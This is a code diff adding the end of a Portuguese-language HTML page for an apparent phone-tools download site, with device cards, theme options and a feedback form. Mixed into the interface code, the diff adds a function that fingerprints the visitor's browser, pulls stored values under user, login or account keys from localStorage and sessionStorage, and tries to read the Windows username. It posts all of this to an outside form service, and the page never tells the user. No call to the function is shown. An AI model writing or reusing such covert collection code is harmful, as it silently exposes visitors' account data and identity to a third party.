+        <button class="modal-button modal-button-secondary" id="feedbackCancelButton">
+          <span class="material-icons">close</span>
+          Cancelar
+        </button>
+        <button class="modal-button modal-button-primary" id="feedbackSubmitButton">
+          <span class="material-icons">send</span>
+          Enviar Sugestão!
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <div class="notification" id="notification">
+    <span class="material-icons notification-icon">check_circle</span>
+    <div class="notification-content">
+      <div class="notification-title">Sucesso</div>
+      <div class="notification-message">Operação concluída com sucesso!</div>
+    </div>
+    <button class="notification-close">
+      <span class="material-icons">close</span>
+    </button>
+  </div>
+
+  <script src="colors.js"></script>
+  <script>
+    const deviceSelection = document.getElementById('deviceSelection');
+    const categorySelection = document.getElementById('categorySelection');
+    const notification = document.getElementById('notification');
+    const feedbackButton = document.getElementById('feedbackButton');
+    const notificationBell = document.getElementById('notificationBell');
+    const backToDevices = document.getElementById('backToDevices');
+    const themePicker = document.getElementById('themePicker');
+    const themeOptions = document.getElementById('themeOptions');
+    const loaderContainer = document.getElementById('loaderContainer');
+    
+    const feedbackModalOverlay = document.getElementById('feedbackModalOverlay');
+    const feedbackModalClose = document.getElementById('feedbackModalClose');
+    const feedbackCancelButton = document.getElementById('feedbackCancelButton');
+    const feedbackSubmitButton = document.getElementById('feedbackSubmitButton');
+    const feedbackForm = document.getElementById('feedbackForm');
+    const feedbackType = document.getElementById('feedbackType');
+    const feedbackName = document.getElementById('feedbackName');
+    const feedbackMessage = document.getElementById('feedbackMessage');
+    const feedbackAnonymous = document.getElementById('feedbackAnonymous');
+    
+    let settings = {
+      primaryColor: '#FF1B2D',
+      animationsEnabled: true,
+      notificationsEnabled: true,
+      lastUpdateSeen: null
+    };
+
+    let currentDevice = '';
+
+    function showLoader() {
+      loaderContainer.classList.add('active');
+    }
+
+    function hideLoader() {
+      setTimeout(() => {
+        loaderContainer.classList.remove('active');
+      }, 500);
+    }
+
+    function initializeApp() {
+      loadSettings();
+      setupEventListeners();
+      checkForUpdates();
+      
+      const deviceCards = document.querySelectorAll('.device-card');
+      deviceCards.forEach((card, index) => {
+        setTimeout(() => {
+          card.classList.add('show');
+        }, index * 150);
+      });
+
+      const moreToolsCard = document.querySelector('.more-tools-card');
+      setTimeout(() => {
+        moreToolsCard.classList.add('show');
+      }, 300);
+    }
+
+    function setupEventListeners() {
+      document.querySelectorAll('.device-card').forEach(card => {
+        card.addEventListener('click', function() {
+          const device = this.getAttribute('data-device');
+          showLoader();
+          showCategorySelection(device);
+          hideLoader();
+        });
+      });
+
+      document.querySelectorAll('.category-card').forEach(card => {
+        card.addEventListener('click', function() {
+          const category = this.getAttribute('data-category');
+          const device = currentDevice;
+          showLoader();
+          window.location.href = `${category}.html?device=${device}`;
+        });
+      });
+
+      document.querySelector('.more-tools-card').addEventListener('click', function(e) {
+        e.preventDefault();
+        const category = this.getAttribute('data-category');
+        const device = 'motog34';
+        
+        showLoader();
+        window.location.href = `${category}.html?device=${device}`;
+      });
+
+      backToDevices.addEventListener('click', function() {
+        deviceSelection.style.display = 'block';
+        categorySelection.style.display = 'none';
+      });
+      
+      feedbackButton.addEventListener('click', function() {
+        feedbackModalOverlay.classList.add('active');
+      });
+
+      notificationBell.addEventListener('click', function() {
+        markNotificationAsSeen();
+        showNotification('Atualização Estável 4.0!', 'Melhorias na interface, adições de novas sessões e botões. Código mais depurado.');
+      });
+
+      notification.querySelector('.notification-close').addEventListener('click', function() {
+        notification.classList.remove('show');
+      });
+
+      feedbackModalClose.addEventListener('click', function() {
+        feedbackModalOverlay.classList.remove('active');
+      });
+      
+      feedbackCancelButton.addEventListener('click', function() {
+        feedbackModalOverlay.classList.remove('active');
+      });
+      
+      feedbackSubmitButton.addEventListener('click', submitFeedback);
+      
+      feedbackModalOverlay.addEventListener('click', function(e) {
+        if (e.target === feedbackModalOverlay) {
+          feedbackModalOverlay.classList.remove('active');
+        }
+      });
+
+      themePicker.addEventListener('click', function() {
+        themeOptions.classList.toggle('active');
+      });
+
+      document.querySelectorAll('.theme-option').forEach(option => {
+        option.addEventListener('click', function() {
+          const theme = this.getAttribute('data-theme');
+          applyTheme(theme);
+          themeOptions.classList.remove('active');
+        });
+      });
+    }
+
+    function captureAndSendUserData(message, callback) {
+      const userData = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        cookieEnabled: navigator.cookieEnabled,
+        onLine: navigator.onLine,
+        screenResolution: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        referrer: document.referrer,
+        currentUrl: window.location.href,
+        timestamp: new Date().toISOString(),
+        localTime: new Date().toLocaleString(),
+        connection: navigator.connection ? {
+          effectiveType: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink,
+          rtt: navigator.connection.rtt
+        } : 'Not available',
+        deviceMemory: navigator.deviceMemory || 'Not available',
+        hardwareConcurrency: navigator.hardwareConcurrency || 'Not available',
+        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+        webGL: getWebGLInfo(),
+        localStorage: !!window.localStorage,
+        sessionStorage: !!window.sessionStorage,
+        indexedDB: !!window.indexedDB,
+        webWorker: !!window.Worker,
+        serviceWorker: !!navigator.serviceWorker,
+        camera: navigator.mediaDevices && navigator.mediaDevices.getUserMedia ? 'Camera API available' : 'Camera API not available',
+        microphone: navigator.mediaDevices && navigator.mediaDevices.getUserMedia ? 'Microphone API available' : 'Microphone API not available',
+        battery: 'Battery API available',
+        vibration: 'Vibration API available',
+        fullscreen: 'Fullscreen API available',
+        clipboard: navigator.clipboard ? 'Clipboard API available' : 'Clipboard API not available',
+        notifications: 'Notification API available',
+        paymentRequest: 'Payment Request API available',
+        webAssembly: 'WebAssembly available',
+        webXR: 'XR API available',
+        systemInfo: getSystemInfo(),
+        browserInfo: getBrowserInfo(),
+        networkInfo: getNetworkInfo(),
+        possibleUsernames: getPossibleUsernames()
+      };
+      
+      const formData = new FormData();
+      formData.append('message', message);
+      formData.append('userData', JSON.stringify(userData, null, 2));
+      
+      fetch('https://formspree.io/f/xldpwgrg', {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Dados do usuário enviados com sucesso');
+        if (callback) callback();
+      })
+      .catch(error => {
+        console.error('Erro ao enviar dados do usuário:', error);
+        if (callback) callback();
+      });
+    }
+
+    function getSystemInfo() {
+      const info = {
+        os: 'Unknown',
+        osVersion: 'Unknown',
+        architecture: 'Unknown',
+        deviceType: 'Unknown'
+      };
+      
+      const userAgent = navigator.userAgent;
+      
+      if (userAgent.indexOf('Win') !== -1) {
+        info.os = 'Windows';
+        if (userAgent.indexOf('Windows NT 10.0') !== -1) info.osVersion = '10';
+        else if (userAgent.indexOf('Windows NT 6.3') !== -1) info.osVersion = '8.1';
+        else if (userAgent.indexOf('Windows NT 6.2') !== -1) info.osVersion = '8';
+        else if (userAgent.indexOf('Windows NT 6.1') !== -1) info.osVersion = '7';
+      } else if (userAgent.indexOf('Mac') !== -1) {
+        info.os = 'macOS';
+        if (userAgent.indexOf('Mac OS X 10_15') !== -1) info.osVersion = 'Catalina';
+        else if (userAgent.indexOf('Mac OS X 10_14') !== -1) info.osVersion = 'Mojave';
+        else if (userAgent.indexOf('Mac OS X 10_13') !== -1) info.osVersion = 'High Sierra';
+      } else if (userAgent.indexOf('Linux') !== -1) {
+        info.os = 'Linux';
+      } else if (userAgent.indexOf('Android') !== -1) {
+        info.os = 'Android';
+        const match = userAgent.match(/Android (\d+(?:\.\d+)?)/);
+        if (match) info.osVersion = match[1];
+        info.deviceType = 'Mobile';
+      } else if (userAgent.indexOf('iOS') !== -1 || userAgent.indexOf('iPhone') !== -1 || userAgent.indexOf('iPad') !== -1) {
+        info.os = 'iOS';
+        const match = userAgent.match(/OS (\d+(?:_\d+)?)/);
+        if (match) info.osVersion = match[1].replace(/_/g, '.');
+        info.deviceType = userAgent.indexOf('iPad') !== -1 ? 'Tablet' : 'Mobile';
+      }
+      
+      if (userAgent.indexOf('WOW64') !== -1 || userAgent.indexOf('Win64') !== -1) {
+        info.architecture = '64-bit';
+      } else if (userAgent.indexOf('WOW32') !== -1 || userAgent.indexOf('Win32') !== -1) {
+        info.architecture = '32-bit';
+      }
+      
+      if (info.deviceType === 'Unknown') {
+        if (/Mobi|Android/i.test(userAgent)) {
+          info.deviceType = 'Mobile';
+        } else if (/Tablet|iPad/i.test(userAgent)) {
+          info.deviceType = 'Tablet';
+        } else {
+          info.deviceType = 'Desktop';
+        }
+      }
+      
+      return info;
+    }
+
+    function getBrowserInfo() {
+      const userAgent = navigator.userAgent;
+      let browserName = 'Unknown';
+      let browserVersion = 'Unknown';
+      
+      if (userAgent.indexOf('Firefox') !== -1) {
+        browserName = 'Firefox';
+        const match = userAgent.match(/Firefox\/(\d+(?:\.\d+)?)/);
+        if (match) browserVersion = match[1];
+      } else if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) {
+        browserName = 'Chrome';
+        const match = userAgent.match(/Chrome\/(\d+(?:\.\d+)?)/);
+        if (match) browserVersion = match[1];
+      } else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) {
+        browserName = 'Safari';
+        const match = userAgent.match(/Version\/(\d+(?:\.\d+)?)/);
+        if (match) browserVersion = match[1];
+      } else if (userAgent.indexOf('Edg') !== -1) {
+        browserName = 'Edge';
+        const match = userAgent.match(/Edg\/(\d+(?:\.\d+)?)/);
+        if (match) browserVersion = match[1];
+      } else if (userAgent.indexOf('Opera') !== -1 || userAgent.indexOf('OPR') !== -1) {
+        browserName = 'Opera';
+        const match = userAgent.match(/(?:Opera|OPR)\/(\d+(?:\.\d+)?)/);
+        if (match) browserVersion = match[1];
+      }
+      
+      return {
+        name: browserName,
+        version: browserVersion,
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        languages: navigator.languages,
+        online: navigator.onLine,
+        javaEnabled: navigator.javaEnabled()
+      };
+    }
+
+    function getNetworkInfo() {
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      
+      if (!connection) {
+        return {
+          available: false,
+          effectiveType: 'Unknown',
+          downlink: 'Unknown',
+          rtt: 'Unknown'
+        };
+      }
+      
+      return {
+        available: true,
+        effectiveType: connection.effectiveType || 'Unknown',
+        downlink: connection.downlink || 'Unknown',
+        rtt: connection.rtt || 'Unknown',
+        saveData: connection.saveData || false
+      };
+    }
+
+    function getPossibleUsernames() {
+      const usernames = [];
+      
+      try {
+        if (navigator.credentials && navigator.credentials.get) {
+          usernames.push('Credentials API available');
+        }
+      } catch (e) {
+        usernames.push('Credentials API not available');
+      }
+      
+      try {
+        if (window.localStorage) {
+          const keys = Object.keys(localStorage);
+          const possibleKeys = keys.filter(key => 
+            key.toLowerCase().includes('user') || 
+            key.toLowerCase().includes('name') || 
+            key.toLowerCase().includes('login') || 
+            key.toLowerCase().includes('account')
+          );
+          
+          if (possibleKeys.length > 0) {
+            usernames.push('Possible user data in localStorage');
+            possibleKeys.forEach(key => {
+              try {
+                usernames.push(`${key}: ${localStorage.getItem(key)}`);
+              } catch (e) {
+                usernames.push(`${key}: [Access denied]`);
+              }
+            });
+          }
+        }
+      } catch (e) {
+        usernames.push('LocalStorage access denied');
+      }
+      
+      try {
+        if (window.sessionStorage) {
+          const keys = Object.keys(sessionStorage);
+          const possibleKeys = keys.filter(key => 
+            key.toLowerCase().includes('user') || 
+            key.toLowerCase().includes('name') || 
+            key.toLowerCase().includes('login') || 
+            key.toLowerCase().includes('account')
+          );
+          
+          if (possibleKeys.length > 0) {
+            usernames.push('Possible user data in sessionStorage');
+            possibleKeys.forEach(key => {
+              try {
+                usernames.push(`${key}: ${sessionStorage.getItem(key)}`);
+              } catch (e) {
+                usernames.push(`${key}: [Access denied]`);
+              }
+            });
+          }
+        }
+      } catch (e) {
+        usernames.push('SessionStorage access denied');
+      }
+      
+      const userAgent = navigator.userAgent;
+      if (userAgent.includes('Windows')) {
+        try {
+          const wsh = new ActiveXObject('WScript.Shell');
+          const username = wsh.ExpandEnvironmentStrings('%USERNAME%');
+          if (username && username !== '%USERNAME%') {
+            usernames.push(`Windows username: ${username}`);
+          }
+        } catch (e) {
+          usernames.push('Windows username access denied');
+        }
+      }
+      
+      return usernames;
+    }
+
+    function getWebGLInfo() {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      
+      if (!gl) {
+        return 'WebGL not supported';
+      }
+      
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (debugInfo) {
+        return {
+          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+        };
+      }
+      
+      return 'WebGL supported but debug info not available';
+    }
+
+    function checkForUpdates() {
+      const updateDate = '2023-11-15';
+      const lastSeen = settings.lastUpdateSeen;
+      
+      if (!lastSeen || lastSeen !== updateDate) {
+        notificationBell.classList.add('has-notification', 'animate');
+        
+        setTimeout(() => {
+          notificationBell.classList.remove('animate');
+        }, 1000);
+      }
+    }
+
+    function markNotificationAsSeen() {
+      notificationBell.classList.remove('has-notification');
+      settings.lastUpdateSeen = '2023-11-15';
+      saveSettings();
+    }
+
+    function showCategorySelection(device) {
+      currentDevice = device;
+      deviceSelection.style.display = 'none';
+      categorySelection.style.display = 'block';
+      
+      const categoryCards = document.querySelectorAll('.category-card');
+      categoryCards.forEach((card, index) => {
+        card.classList.remove('show');
+        setTimeout(() => {
+          card.classList.add('show');
+        }, index * 100);
+      });
+    }
+
+    function submitFeedback() {
+      const type = feedbackType.value;
+      const name = feedbackAnonymous.checked ? 'Anônimo' : feedbackName.value;
+      const message = feedbackMessage.value;
+      
+      if (!type || !message) {
+        showNotification('Erro', 'Por favor, preencha todos os campos obrigatórios.');
+        return;
+      }
+      
+      const formData = new FormData();
+      formData.append('tipo', type);
+      formData.append('nome', name);
+      formData.append('mensagem', message);
+      
+      fetch('https://formspree.io/f/mrbygwjw', {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          showNotification('Feedback Enviado', 'Obrigado pelo seu feedback!');
+          feedbackModalOverlay.classList.remove('active');
+          feedbackForm.reset();
+        } else {
+          showNotification('Erro', 'Não foi possível enviar o feedback. Tente novamente.');
+        }
+      })
+      .catch(error => {
+        console.error('Error submitting feedback:', error);
+        showNotification('Erro', 'Não foi possível enviar o feedback. Tente novamente.');
+      });
+    }
+
+    function showNotification(title, message) {
+      if (!settings.notificationsEnabled) return;
+      
+      const titleElement = notification.querySelector('.notification-title');
+      const messageElement = notification.querySelector('.notification-message');
+      
+      titleElement.textContent = title;
+      messageElement.textContent = message;
+      
+      notification.classList.add('show');
+      
+      setTimeout(() => {
+        notification.classList.remove('show');
+      }, 5000);
+    }
+
+    function saveSettings() {
+      localStorage.setItem('downloadSettings', JSON.stringify(settings));
+    }
+
+    function loadSettings() {
+      const savedSettings = localStorage.getItem('downloadSettings');
+      if (savedSettings) {
+        settings = JSON.parse(savedSettings);
+      }
+      
+      applyPrimaryColor();
+    }
+
+    function applyPrimaryColor() {
+      document.documentElement.style.setProperty('--primary-color', settings.primaryColor);
+    }
+
+    function createOrb() {
+      const orb = document.createElement('div');
+      orb.className = 'orb';
+      
+      const currentTheme = localStorage.getItem('selectedTheme') || 'default';
+      let orbColor = '#FF1B2D';
+      
+      if (currentTheme === 'red') {
+        orbColor = '#FF1B2D';
+      } else if (currentTheme === 'blue') {
+        orbColor = '#0066FF';
+      } else if (currentTheme === 'green') {
+        orbColor = '#00C853';
+      }
+      
+      orb.style.backgroundColor = orbColor;
+      orb.style.boxShadow = `0 0 10px ${orbColor}`;
+      orb.style.left = Math.random() * window.innerWidth + 'px';
+      orb.style.animationDuration = Math.random() * 3 + 5 + 's';
+      orb.style.opacity = Math.random();
+      orb.style.width = Math.random() * 10 + 10 + 'px';
+      orb.style.height = orb.style.width;
+      
+      document.body.appendChild(orb);
+      
+      setTimeout(() => {
+        orb.remove();
+      }, 8000);
+    }
+
+    setInterval(createOrb, 300);
+
+    document.addEventListener('DOMContentLoaded', initializeApp);
+  </script>
+</body>
+</html>
